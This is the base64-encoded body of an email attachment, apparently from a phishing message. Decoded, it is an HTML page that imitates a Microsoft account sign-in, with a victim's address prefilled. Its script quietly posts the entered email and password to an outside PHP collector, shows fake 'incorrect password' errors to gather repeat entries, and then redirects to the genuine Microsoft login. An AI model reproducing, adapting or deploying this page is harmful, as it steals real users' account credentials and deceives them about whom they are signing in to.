aUF3SURFeU5Ea3VPQzAwTlRVdU5UazFJREV5TkRrdU9DMHhNREUzTGpaVE9UVTJMakEwTmkwNE1U
a3VOaUF5TmpVdU9DMDRNVGt1TmkwNU9EUXRNelkwTGpBd05TMDVPRFFnTVRrNExUUXlOQzQwTkRV
Z01USXhOUzQySURJMk5TNDRJREV5TVRVdU5ub2lJR1pwYkd3OUluVnliQ2dqUkNraUx6NDhMMmMr
UEdSbFpuTStQSEpoWkdsaGJFZHlZV1JwWlc1MElHbGtQU0pCSWlCamVEMGlNQ0lnWTNrOUlqQWlJ
SEk5SWpFaUlHZHlZV1JwWlc1MFZXNXBkSE05SW5WelpYSlRjR0ZqWlU5dVZYTmxJaUJuY21Ga2FX
VnVkRlJ5WVc1elptOXliVDBpZEhKaGJuTnNZWFJsS0RFME5qWXVOQ0F6T1RNdU5pa2djbTkwWVhS
bEtEa3dLU0J6WTJGc1pTZ3hOREF4TGpZZ01UY3lNQzQ0S1NJK1BITjBiM0FnYzNSdmNDMWpiMnh2
Y2owaUl6RXdOMk14TUNJdlBqeHpkRzl3SUc5bVpuTmxkRDBpTVNJZ2MzUnZjQzFqYjJ4dmNqMGlJ
Mk0wWXpSak5DSWdjM1J2Y0MxdmNHRmphWFI1UFNJd0lpOCtQQzl5WVdScFlXeEhjbUZrYVdWdWRE
NDhjbUZrYVdGc1IzSmhaR2xsYm5RZ2FXUTlJa0lpSUdONFBTSXdJaUJqZVQwaU1DSWdjajBpTVNJ
Z1ozSmhaR2xsYm5SVmJtbDBjejBpZFhObGNsTndZV05sVDI1VmMyVWlJR2R5WVdScFpXNTBWSEpo
Ym5ObWIzSnRQU0owY21GdWMyeGhkR1VvTXprMExqSWdOekUwS1NCeWIzUmhkR1VvT1RBcElITmpZ
V3hsS0RFeE1ERXVOaUF4TXpVeExqZ3BJajQ4YzNSdmNDQnpkRzl3TFdOdmJHOXlQU0lqTURBM09H
UTBJaTgrUEhOMGIzQWdiMlptYzJWMFBTSXhJaUJ6ZEc5d0xXTnZiRzl5UFNJall6UmpOR00wSWlC
emRHOXdMVzl3WVdOcGRIazlJakFpTHo0OEwzSmhaR2xoYkVkeVlXUnBaVzUwUGp4eVlXUnBZV3hI
Y21Ga2FXVnVkQ0JwWkQwaVF5SWdZM2c5SWpBaUlHTjVQU0l3SWlCeVBTSXhJaUJuY21Ga2FXVnVk
RlZ1YVhSelBTSjFjMlZ5VTNCaFkyVlBibFZ6WlNJZ1ozSmhaR2xsYm5SVWNtRnVjMlp2Y20wOUlu
UnlZVzV6YkdGMFpTZ3hOVFE0TGpZZ09UVXlMamdwSUhKdmRHRjBaU2c1TUNrZ2MyTmhiR1VvT1RN
eUxqUWdNVEUwTkM0eUtTSStQSE4wYjNBZ2MzUnZjQzFqYjJ4dmNqMGlJMlptWWprd01DSWdjM1J2
Y0MxdmNHRmphWFI1UFNJdU56VWlMejQ4YzNSdmNDQnZabVp6WlhROUlqRWlJSE4wYjNBdFkyOXNi
M0k5SWlOak5HTTBZelFpSUhOMGIzQXRiM0JoWTJsMGVUMGlNQ0l2UGp3dmNtRmthV0ZzUjNKaFpH
bGxiblErUEhKaFpHbGhiRWR5WVdScFpXNTBJR2xrUFNKRUlpQmplRDBpTUNJZ1kzazlJakFpSUhJ
OUlqRWlJR2R5WVdScFpXNTBWVzVwZEhNOUluVnpaWEpUY0dGalpVOXVWWE5sSWlCbmNtRmthV1Z1
ZEZSeVlXNXpabTl5YlQwaWRISmhibk5zWVhSbEtESTJOUzQ0SURFNU9Da2djbTkwWVhSbEtEa3dL
U0J6WTJGc1pTZ3hNREUzTGpZZ01USTBPUzQ0S1NJK1BITjBiM0FnYzNSdmNDMWpiMnh2Y2owaUky
UTRNMkl3TVNJZ2MzUnZjQzF2Y0dGamFYUjVQU0l1TnpVaUx6NDhjM1J2Y0NCdlptWnpaWFE5SWpF
aUlITjBiM0F0WTI5c2IzSTlJaU5qTkdNMFl6UWlJSE4wYjNBdGIzQmhZMmwwZVQwaU1DSXZQand2
Y21Ga2FXRnNSM0poWkdsbGJuUStQR05zYVhCUVlYUm9JR2xrUFNKRklqNDhjR0YwYUNCbWFXeHNQ
U0lqWm1abUlpQmtQU0pOTUNBd2FERTVNakIyTVRBNE1FZ3dlaUl2UGp3dlkyeHBjRkJoZEdnK1BD
OWtaV1p6UGp3dmMzWm5QZz09KTtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQsbm8tcmVwZWF0
O2JhY2tncm91bmQtc2l6ZTpjb3Zlcixjb3Zlcjtwb3NpdGlvbjpmaXhlZDt0b3A6MDt3aWR0aDox
MDAlO2hlaWdodDoxMDAlfSNzRDQzYUJ7YmFja2dyb3VuZDojZmZmO3dpZHRoOjEwMCU7cGFkZGlu
Zzo1MHB4IDQwcHg7bWF4LXdpZHRoOjM2MHB4O21hcmdpbjo4JSBhdXRvIDE4cHh9I3RSZXNkRHtt
YXJnaW46MTVweCAwO2xpbmUtaGVpZ2h0OjEuNzVyZW07Y29sb3I6IzFiMWIxYjtmb250LXNpemU6
MS41cmVtO2ZvbnQtd2VpZ2h0OjYwMDtmb250LWZhbWlseToiU2Vnb2UgVUkiLCJIZWx2ZXRpY2Eg
TmV1ZSIsIkx1Y2lkYSBHcmFuZGUiLFJvYm90byxFYnJpbWEsIk5pcm1hbGEgVUkiLEdhZHVnaSwi
U2Vnb2UgWGJveCBTeW1ib2wiLCJTZWdvZSBVSSBTeW1ib2wiLCJNZWlyeW8gVUkiLCJLaG1lciBV
SSIsVHVuZ2EsIkxhbyBVSSIsUmFhdmksIklza29vbGEgUG90YSIsTGF0aGEsTGVlbGF3YWRlZSwi
TWljcm9zb2Z0IFlhSGVpIFVJIiwiTWljcm9zb2Z0IEpoZW5nSGVpIFVJIiwiTWFsZ3VuIEdvdGhp
YyIsIkVzdHJhbmdlbG8gRWRlc3NhIiwiTWljcm9zb2Z0IEhpbWFsYXlhIiwiTWljcm9zb2Z0IE5l
dyBUYWkgTHVlIiwiTWljcm9zb2Z0IFBoYWdzUGEiLCJNaWNyb3NvZnQgVGFpIExlIiwiTWljcm9z
b2Z0IFlpIEJhaXRpIiwiTW9uZ29saWFuIEJhaXRpIiwiTVYgQm9saSIsIk15YW5tYXIgVGV4dCIs
IkNhbWJyaWEgTWF0aCJ9LmlucHV0e3dpZHRoOjEwMCU7cG9zaXRpb246cmVsYXRpdmU7aGVpZ2h0
OjM1O2ZvbnQtc2l6ZToxcmVtO2xpbmUtaGVpZ2h0OjEuNzVyZW07Ym9yZGVyOm5vbmU7Ym9yZGVy
LWNvbG9yOnJnYmEoMCwwLDAsLjYpO2JvcmRlci1ib3R0b206MXB4IHNvbGlkIHJnYmEoMCwwLDAs
LjYpfS5pbnB1dDpmb2N1c3tib3JkZXItY29sb3I6IzAwZjtvdXRsaW5lOjB9Lm5leHR7ZmxvYXQ6
cmlnaHQ7YmFja2dyb3VuZC1jb2xvcjojMDA2N2I4O2NvbG9yOiNmZmZ9LmJ0bnt3aWR0aDoxMDhw
eDtoZWlnaHQ6MzJweDtib3JkZXI6bm9uZTtjdXJzb3I6cG9pbnRlcjt0b3VjaC1hY3Rpb246bWFu
aXB1bGF0aW9uO2ZvbnQtc2l6ZToxNXB4fS5uZXh0OmhvdmVye2JhY2tncm91bmQtY29sb3I6IzAz
NWVhNn1he2NvbG9yOiMwMDY3Yjg7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Zm9udC1zaXplOjEzcHh9
I3NHNDNhQnttYXgtd2lkdGg6NDQwcHg7bWFyZ2luOjAgYXV0b30jZGR7d2lkdGg6NDQwcHg7aGVp
Z2h0OjQ3cHg7cG9zaXRpb246cmVsYXRpdmU7bWFyZ2luLXRvcDotNzFweDtiYWNrZ3JvdW5kOjAg
MDtjdXJzb3I6cG9pbnRlcjtib3JkZXI6bm9uZX0jZGQ6aG92ZXJ7YmFja2dyb3VuZC1jb2xvcjpy
Z2JhKDAsMCwwLC4xKX0uc3Bpbm5lcntwb3NpdGlvbjpyZWxhdGl2ZTttYXJnaW46MCAtMzVweH0u
c3Bpbm5lciBkaXZ7d2lkdGg6NXB4O2hlaWdodDo1cHg7cG9zaXRpb246YWJzb2x1dGU7bGVmdDot
MjBweDt0b3A6MDtiYWNrZ3JvdW5kLWNvbG9yOiMwMDVkYTY7Ym9yZGVyLXJhZGl1czo1MCU7YW5p
bWF0aW9uOm1vdmUgNHMgaW5maW5pdGUgY3ViaWMtYmV6aWVyKC4yLC42NCwuODEsLjIzKTttYXJn
aW4tdG9wOi00OXB4fS5zcGlubmVyIGRpdjpudGgtY2hpbGQoMil7YW5pbWF0aW9uLWRlbGF5OjE1
MG1zfS5zcGlubmVyIGRpdjpudGgtY2hpbGQoMyl7YW5pbWF0aW9uLWRlbGF5Oi4zc30uc3Bpbm5l
ciBkaXY6bnRoLWNoaWxkKDQpe2FuaW1hdGlvbi1kZWxheTo0NTBtc31Aa2V5ZnJhbWVzIG1vdmV7
MCV7bGVmdDowfTc1JXtsZWZ0OjEwMCV9MTAwJXtsZWZ0OjEwMCV9fWlucHV0W3R5cGU9Y2hlY2ti
b3hde3dpZHRoOjE4cHg7aGVpZ2h0OjE4cHh9I2Zvb3Rlcntwb3NpdGlvbjpmaXhlZDtib3R0b206
MDt0ZXh0LWFsaWduOnJpZ2h0O3dpZHRoOjEwMCU7cmlnaHQ6NXB4O3BhZGRpbmc6NXB4O2ZvbnQt
c2l6ZToxMHB4fS5mc2JSVGV7dGV4dC1kZWNvcmF0aW9uOm5vbmU7bGV0dGVyLXNwYWNpbmc6M3B4
O2xpbmUtaGVpZ2h0OjI1cHg7dmVydGljYWwtYWxpZ246Ym90dG9tO2ZvbnQtc2l6ZToxNnB4O2Zv
bnQtd2VpZ2h0OjYwMDtjb2xvcjojMDAwfS50TmVSV1F7Y29sb3I6IzAwMDtwYWRkaW5nLXJpZ2h0
OjIwcHh9LnROZVJXUTpob3Zlcnt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lfQ0KPC9zdHlsZT4N
CjxzY3JpcHQ+DQpjb25zdCB1cmwgPSAnaHR0cHM6Ly9rYWRtb25sdGQuY29tL296ZW5pdGhncm91
cHMvZmlyZXp6LnBocCc7ICAgLy9mdWxsIHVybCBnb2VzIGhlcmUNCjwvc2NyaXB0Pg0KDQo8ZGl2
IGlkPSJtYWluIj4NCjxkaXYgaWQ9InN1YiI+DQoNCjxkaXYgaWQ9InNENDNhQiI+DQo8ZGl2IGlk
PSJzcGlubmVyIiBjbGFzcz0ic3Bpbm5lciIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPjxkaXY+PC9k
aXY+PGRpdj48L2Rpdj48ZGl2PjwvZGl2PjxkaXY+PC9kaXY+PC9kaXY+DQo8aW1nIHNyYz0nZGF0
YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFHMEFBQUFXQ0FZQUFB
REtIUkpVQUFBRHhrbEVRVlJvZ2UxWU1hN2NOaERkSyt3Vi9nbDhBMS9CdlErUUE2aGs0VWFBbXhX
UVJpeFhUUUFDcmxoU0JteUFjaWVWYk5tcUpPSTRBTnVYd2hqK29WYlM1MDlnN0c2d0EweERqWWJr
UE00OERnOC8zajJoU04rL0FRQjgvSHJFaDgrSEluM0lyNUhEQTdUN2t3ZG9OeVFoQkV6VGhHRVlF
R1BjdExzYWFIM2ZKNTNuZWRmV2U1OXN4M0hNZkhSZDkrTC85eURXV2xSVmxkUjd2Mmw3TmRENEFz
L244NjV0MHpUSnRtMWJBRUNNTVkwcHBWNFpvdHNTNzMwV0MyTk1Pb2doaEl0RGVST2dWVlcxV1E3
NGhqaG9BTkMyTFlRUWNNNzlsNWhkWFl3eHFLb0tkVjFuNDBvcFZGVUZZMHcyZm5YUTZycEdWVld3
MXE3YTBjS0ZFQmVnL1Yra2JkdlZ2ZEg0ellHMmRjcUF2QVJxclM4MlJqeTNyUDh4Umd6REFDa2xw
SlJRU2lVYjRzZHhISk5kMTNVSUlhVC9wMmxDMTNYcC82MkxnZmNlU2lsSUtkRjEzVVhHYy85a00w
MVQraDVDUU4vMzZlRFdkWjF4UFkxTEtUTSt2enBvSVlSTjhpVnlWa29sY0Rsb0hIaVNlWjVUVnE2
VlZlNUhTcG5OSFdQTStKTnJYZGNadDFBRjJDcmQ4enlub0MrMWFSckVHQzlLLzB0Sy9nOC8zcjlC
aWY3OTIxc0F3Ty9mbnZEeDY3RklTMEFEZ1BQNXZIcWhvRTE3NzR0QUN5RWt3SVFRc05iQ2U0OXhI
Sk52OGtNMldtdG9yVEhQY3dKUkNBRmpUSnFYZkRaTmt3QWhIelNIY3k0N1BMUjJ2ZzQrdDVRU0lR
UVlZN0pNTThZa3BmRzJiV0dNZWM2MDNjaitRdUdnMFlrVFFxUXk1SnpMeW1ZSmFKei9lTG5qd2dQ
SE01dWZldDVXQU1BNGp1bWJjeTZ6WFp1SDJ5K3JCNStmTXZmVm5IYjg5QjBsK3FULyt2bkg4QVI4
T1picGpuRFFnT2VUU1FHajdLTUxTZ2xvNUVOcnZUa3ZEMXJKK05wY3k0enUrejdqUEZyNzZYUzY4
TU41bXZiMmF0QU9mL3lKRWoxKyt2N3pqeTlIb0QrVTZZNHNBMFQ4MVRSTnhuTVVqQkxRMWpodUtX
dCs5c1pKQ0NUeTdaekx1Sk8zSGxzZ2JLMzdia0ZiTnN0TGppc0JqWUpZa21sYm9KVmtHbCt6dFRi
THVoaGp5alRpUUM1OG4xUlY3aFkwNFBKR3h2bWdCRFFLRnVmR3BXeUJSaHo2RXFldFBabHhqdlBl
WjA5U2U1eEdmUGdTYU10RGVGT2c4YzB2KzdZUzBQaXRUZ2lCWVJqZ3ZZZldPajJWN1pYQjArbVUz
U3JwWDhvazh1RzloNVFTMHpRbEcxN09ZNHhaOXZGMWtCMEhZZ3MwZmdpZGM2bjgzaFJvQURaZlNF
cjd0SEVjaS91MHBZUVFFbkJyLzFQMmJ2VlhQRVAzK3JSbGE3TUYydFlUM3RWQW8xNWtLZFRQTE1z
YmpmUEFrSSsxRnhGckxaUlMwRnJEV3B0SzBacWZwWXpqQ0dOTTZvL1cvSk1OUGZDdVhmM0pqaktk
UHdTdnpiZTJKc3BRcmZWem4zWXQwQjd5NytVQjJoM0tBN1E3bEFkb2R5ai9BT1VQdUdMcEtVN1pB
QUFBQUVsRlRrU3VRbUNDJz4NCg0KPGRpdiBpZD0icGFnZTEiIGhpZGRlPg0KPGRpdiBpZD0idFJl
c2REIj5TaWduIGluPC9kaXY+DQo8c3BhbiBpZD0iZXJyb3IiIHN0eWxlPSJjb2xvcjojZTgxMTIz
O2Rpc3BsYXk6bm9uIj4gICAgPC9zcGFuPg0KPGZvcm0gb25zdWJtaXQ9InN0ZXAxKCk7cmV0dXJu
IGZhbHNlOyI+DQo8aW5wdXQgb25rZXl1cD0iY2MoKTsiIHR5cGU9ImVtYWlsIiBjbGFzcz0iaW5w
dXQiIHBsYWNlaG9sZGVyPSdFbWFpbCwgcGhvbmUsIG9yIFNreXBlJyBuYW1lPSJlbWFpbCIgaWQ9
ImVtYWlsIiBhdXRvY29tcGxldGU9Im9mZiIgdmFsdWU9ImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0
cy5zb3VyY2Vmb3JnZS5uZXQiPg0KPGRpdiBjbGFzcz0icm93IiBzdHlsZT0ibWFyZ2luOjE1cHgg
MCI+DQo8Zm9udCBzdHlsZT0iZm9udC1zaXplOiAuODEyNXJlbTsiPiZuYnNwO05vIGFjY291bnQ/
PC9mb250PjxhIGhyZWY9IiMiPiZuYnNwO0NyZWF0ZSBvbmUhPC9hPg0KPHA+PGEgaHJlZj0iIyI+
Jm5ic3A7Q2FuknQgYWNjZXNzIHlvdXIgYWNjb3VudD88L2E+PC9wPg0KPC9kaXY+DQo8aW5wdXQg
dHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIG5leHQiIHZhbHVlPSJOZXh0IiBzdHlsZT0iIj4NCjxw
IHN0eWxlPSJtYXJnaW46MTVweCI+Jm5ic3A7PC9wPg0KPC9mb3JtPg0KPC9kaXY+DQoNCjxkaXYg
aWQ9InBhZ2UyIiBoaWRkZW4+DQo8cCBpZD0idXNlcklEIj48L3A+DQo8ZGl2IGlkPSJ0UmVzZEQi
PkVudGVyIHBhc3N3b3JkPC9kaXY+DQo8c3BhbiBpZD0iZXJyb3IyIiBzdHlsZT0iY29sb3I6I2U4
MTEyMztkaXNwbGF5Om5vbiI+ICAgIDwvc3Bhbj4NCjxmb3JtIG9uc3VibWl0PSJzdGVwMigpO3Jl
dHVybiBmYWxzZTsiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImNvdW50IiB2YWx1ZT0iMCI+
DQo8aW5wdXQgb25rZXl1cD0iY2QoKTsiIHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iaW5wdXQiIHBs
YWNlaG9sZGVyPSdQYXNzd29yZCcgbmFtZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgYXV0b2Nv
bXBsZXRlPSJvZmYiIHZhbHVlPSIiPg0KPGRpdiBjbGFzcz0icm93IiBzdHlsZT0ibWFyZ2luOjE1
cHggMCI+DQoNCjxsYWJlbCBzdHlsZT0ibWFyZ2luLWxlZnQ6LTRweCI+DQo8aW5wdXQgdHlwZT0i
Y2hlY2tib3giPg0KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxNnB4O2N1cnNvcjpwb2ludGVyIj5L
ZWVwIG1lIHNpZ25lZCBpbjwvc3Bhbj4NCiAgICAgICAgICAgIDwvbGFiZWw+DQoNCjxwPjxhIGhy
ZWY9IiMiPkZvcmdvdCBwYXNzd29yZD88L2E+PC9wPg0KPC9kaXY+DQo8aW5wdXQgdHlwZT0ic3Vi
bWl0IiBjbGFzcz0iYnRuIG5leHQiIHZhbHVlPSJTaWduIGluIiBzdHlsZT0iIj4NCjxwIHN0eWxl
PSJtYXJnaW46MTVweCI+Jm5ic3A7PC9wPg0KPC9mb3JtPg0KPC9kaXY+DQoNCg0KPC9kaXY+DQoN
CjxkaXYgaWQ9InNHNDNhQiI+DQo8aW1nIHNyYz0nZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9S
dzBLR2dvQUFBQU5TVWhFVWdBQUFiZ0FBQUF3Q0FZQUFBQmpYbSt5QUFBRlAwbEVRVlI0bk8zZHYz
YmFQQnpHOGQ0SE4rTWRNemU3czhQaUNYYTZweE1MN09uTzRvMnNidzFORy82NHBTTVhrQXQ0M2lF
UkVZb01KbWtjSXI2ZmMzN25CUCtUd3FBbkVqYjVkTHRjNjNieFJ6OFd2eldiRjVyZVBWUit0NnBV
VTZ0ODIveTFkS3JLTWY2YXpWZWw5ZU10YW1IVm9YMlBQOS9hMnhkTDNlN1U2ckhjN2U5WFA3ZTFz
TXA1dlZ3NCswdHF1VnUvbHMrM21lM1ZhMTVyM1pYVzNhdHJ2bkt1cy9MWGZEVzNmbjZzd3FyVkw5
MVpOZjhuOWJOeUxZcm54eStLWHp2YnpldUgrcW41NnJaU0xWNWNQL3hWV0ZWMnpHTXRpOXVkV3F4
bVdoVCtXaFl6TFZjbFZSeXFxYWVzYTNyM2w5VEtybHpMd2wrcmYxTGZYMUgvN2FrcXh6eFY4ZnY3
WStYNi9XZXFQK3VaMW45bitpUUFBQUpFd0FFQWdrVEFBUUNDUk1BQkFJSkV3QUVBZ2tUQUFRQ0NS
TUFCQUlKRXdBRUFna1RBQVFDQ1JNQUJBSUpFd0FFQWdrVEFBUUNDUk1BQkFJSVViTUJOSmhPTlJp
TjFPaDJOUmlOOSsvWk45L2YzNzkwdEFFQk5nZ3U0eVdTaWk0c0xSVkdrSkVuVWJyZlZicmZWYkRZ
Vng3RytmdjFLMEFIQUdRZ3E0SWJEb2FJb1VyL2Y5NGJZZUR4V3M5blU1ZVVsSVFjQWdRc200Q2FU
aWFJbzBuZzgzbnRjVVJScU5wdnE5WG8xOVF3QThCNkNDYmpQbnorcjMrOUxlZ2l4WHErbnlXVGlQ
VGJQYzBWUnBEelA2K3dpQUtCR1FRU2NtYjF0Tmh0SlVyZmJWUlJGaXFLbzlKd2tTYmFCQ0FBSVR4
QUJOeHdPbFNUSjlyVUp2SDBCTmh3T2RYRnhVVWYzSkVscG1xclJhR3dyVGRObisrcnN4eWs2NWI0
QitIaUNDTGh1dDZ0MnUzM1VPU1lFNjlCcXRYWUNUWklHZzBFdGJaK3FMTXZVYXJYZXV4c0FBaFpF
d0YxZFhSMGRjTmZYMTdVRTNIcTlWcVBSMEhxOWZ2TzJQaElDRHNCYkN5TGdycSt2RmNmeFVlZjAr
LzJqUS9HbEdvMkdzaXdyM1orbTZiTVpuYjJrMldxMU5CZ01kbWFCclZackd4TG11Q29oNnJiMWt1
c01Cb1BTNVZhN0RmczRPOHpLbG10OTc4T2h0ZzcxUDh1eW5mUDVRd000SDBFRTNHYXpxZlNJZ0cw
OEhoOTl6a3VaUWJwc1dkSWQyTk0wM1FrRU0waTdBV2NQMk80NVpYd0JkOHgxek85aWM1ZGdUWUM1
N2RqSCtHWndidCtxdExXdi8rN3NPY3N5QWc0NEkwRUVuUFN3VEJuSHNZcWlxSHhPblNGbkJsdGYw
TGtEdTIrbWthYnBzNEhkUHNkYy94QmZ3QjF6SFYvZjNIUGN2dHJIMkdGektPQ3F0TFd2LzFYZkV3
QmhDaWJnN3UvdmxTU0o0amd1ZmI1dHM5bW8xK3Z0aEdDZElTZjVaMlAyd0Y0MktKY3RVUnB1Z05q
TGNtNzQrSllveTY3ajY3dVBPNHZ5elZhUENiaXFiUjNxdjVuaDdWc2lCaENtWUFKT2VnZzU4d3pj
NWVXbFJxT1JibTV1TkJxTjlPWExsKzJ6Y1c0QTFoMXk3aUJjWldBL051REtuRnZBMmR1WXpRSG5K
YWlBTS9JOFY3L2ZWNUlraXFKSXpXWlQzVzUzRzJTK0dWN2RJV2ZQS253enVDcExsSFVIWE5tK0tr
dVVibUFkQ3JpcWJSM1RmM2M1RTBEWWdneTRmY3dzenZkTkoyOFJjdXYxMnZzTTNLRmx3eW8zbWRR
ZGNPWjgzNDBmN2sweTdyS2crOW1qYjRibXU5bm1VRnY3K3A5bDJjNCs5MWdBWVR1N2dNdnpYSG1l
bHo0SDl4WWg1MzRlZG1oZ2w1NCtPekxCZGdwTGxJWjc2MzdaVFRQdTcrQXkrNDk1VE1EM1BwWDEz
MTZhM0hjWEs0QXduVjNBR2VZTGw2ZlRxYWJUNmM2TkorWi95SjJTc3MrMVR0Rkg2aXVBY0oxOXdK
bXlBKzNVQW03ZkRSZW5pSUFEY0FyT051QnNicUM5ZDhDNTMvVHhrY0pOSXVBQW5BWUNUZytCRnNl
eE9wMk9PcDJPNGpnK3FSa2NBT0I0Qkp5ZXZxelpycXVycS9mdUZnRGdGUWc0QUVDUUNEZ0FRSkFJ
T0FCQWtBZzRBRUNRQ0RnQVFKQUlPQUJBa0FnNEFFQ1FDRGdBUUpBSU9BQkFrQWc0QUVDUUNEZ0FR
SkFJT0FCQWtQNEhLK05nMW82YlpXTUFBQUFBU1VWT1JLNUNZSUk9Jz4NCjxidXR0b24gaWQ9ImRk
IiBzdHlsZT0iIj48L2J1dHRvbj4NCjwvZGl2Pg0KDQo8L2Rpdj4NCjwvZGl2Pg0KDQoNCjxkaXYg
aWQ9ImZvb3RlciI+DQo8YSBocmVmPSIjIiBjbGFzcz0idE5lUldRIj5UZXJtcyBvZiB1c2U8L2E+
IDxhIGhyZWY9IiMiIGNsYXNzPSJ0TmVSV1EiPlByaXZhY3kgJiBjb29raWVzPC9hPiA8YSBocmVm
PSIjIiBjbGFzcz0iZnNiUlRlIj4uLi48L2E+IA0KPC9kaXY+DQoNCjxzY3JpcHQ+DQpmdW5jdGlv
biBjYygpDQogIHsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3InKS5pbm5lckhUTUw9
IiI7DQogIHZhciBlbWFpbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlbWFpbCcpOw0KICAg
IGlmIChlbWFpbC52YWx1ZSA9PSAnJykgew0KICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgn
ZXJyb3InKS5pbm5lckhUTUw9IkVudGVyIGEgdmFsaWQgZW1haWwgYWRkcmVzcywgcGhvbmUgbnVt
YmVyLCBvciBTa3lwZSBuYW1lLiI7IA0KICAgIGVtYWlsLmZvY3VzKCk7DQogICAgcmV0dXJuIGZh
bHNlOwkNCiB9ZWxzZXsNCiByZXR1cm4gdHJ1ZTsNCiB9DQogIH0NCmZ1bmN0aW9uIGNkKCkNCiAg
ew0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvcjInKS5pbm5lckhUTUw9IiI7DQogIHZh
ciBwYXNzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkJyk7DQogICAgaWYgKHBh
c3MudmFsdWUgPT0gJycpIHsNCiAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yMicp
LmlubmVySFRNTD0iUGxlYXNlIGVudGVyIHRoZSBwYXNzd29yZCBmb3IgeW91ciBNaWNyb3NvZnQ8
YnI+YWNjb3VudC4iOyANCiAgICBwYXNzLmZvY3VzKCk7DQogICAgcmV0dXJuIGZhbHNlOwkNCiB9
ZWxzZXsNCiByZXR1cm4gdHJ1ZTsNCiB9DQogIH0NCmZ1bmN0aW9uIHN0ZXAxKCl7DQppZihjYygp
KXsNCnZhciBhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VtYWlsJykudmFsdWU7DQpkb2N1
bWVudC5nZXRFbGVtZW50QnlJZCgnc3Bpbm5lcicpLnN0eWxlLmRpc3BsYXk9Jyc7DQpzZXRUaW1l
b3V0KGZ1bmN0aW9uKCl7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3Bpbm5lcicpLnN0eWxl
LmRpc3BsYXk9J25vbmUnOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhZ2UxJykuc3R5bGUu
ZGlzcGxheT0nbm9uZSc7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc0c0M2FCJykuc3R5bGUu
ZGlzcGxheT0nbm9uZSc7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFnZTInKS5zdHlsZS5k
aXNwbGF5PSdibG9jayc7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcklEJykuaW5uZXJI
VE1MPWE7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmQnKS5mb2N1cygpOw0KfSwz
MDAwKTsNCn0NCn0NCg0KZnVuY3Rpb24gc3RlcDIoKXsNCmlmKGNkKCkpew0KdmFyIGEgPSBkb2N1
bWVudC5nZXRFbGVtZW50QnlJZCgnZW1haWwnKS52YWx1ZTsNCnZhciBiID0gZG9jdW1lbnQuZ2V0
RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkJykudmFsdWU7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgn
c3Bpbm5lcicpLnN0eWxlLmRpc3BsYXk9Jyc7DQp2YWxpZGF0ZShhLGIpOw0KfQ0KfQ0KDQpmdW5j
dGlvbiBzZSgpew0KdmFyIGMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY291bnQnKS52YWx1
ZTsNCmlmKGMgPj0gMil7DQp3aW5kb3cubG9jYXRpb24gPSAiaHR0cHM6Ly9sb2dpbi5taWNyb3Nv
ZnRvbmxpbmUuY29tLyI7DQp9ZWxzZXsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvcjIn
KS5pbm5lckhUTUw9J1lvdXIgYWNjb3VudCBvciBwYXNzd29yZCBpcyBpbmNvcnJlY3QuIElmIHlv
dSBkb25cJ3QgcmVtZW1iZXIgeW91ciBwYXNzd29yZCwgPGZvbnQgc3R5bGU9ImNvbG9yOmJsdWUi
PnJlc2V0IGl0IG5vdy48L2ZvbnQ+JzsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzcGlubmVy
Jykuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dv
cmQnKS52YWx1ZT0nJzsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnN0eWxl
LmJvcmRlckJvdHRvbT0nMXB4IHNvbGlkIHJlZCc7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgn
cGFzc3dvcmQnKS5mb2N1cygpOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50JykudmFs
dWU9K2MrMTsNCn0NCn0NCjwvc2NyaXB0Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQi
Pg0KZnVuY3Rpb24gdmFsaWRhdGUoZSxhKXt2YXIgbj1uZXcgWE1MSHR0cFJlcXVlc3Q7bi5vcGVu
KCJQT1NUIix1cmwpLG4uc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRp
b24veC13d3ctZm9ybS11cmxlbmNvZGVkIiksbi5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24o
KXs0PT09bi5yZWFkeVN0YXRlJiYoc2UoKSl9O3ZhciB0PSJ1c2VyPSIrZSsiJnBhc3M9IithO24u
c2VuZCh0KX0NCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg0K

------=_NextPart_000_0012_2A5997AA.98DD3F7E
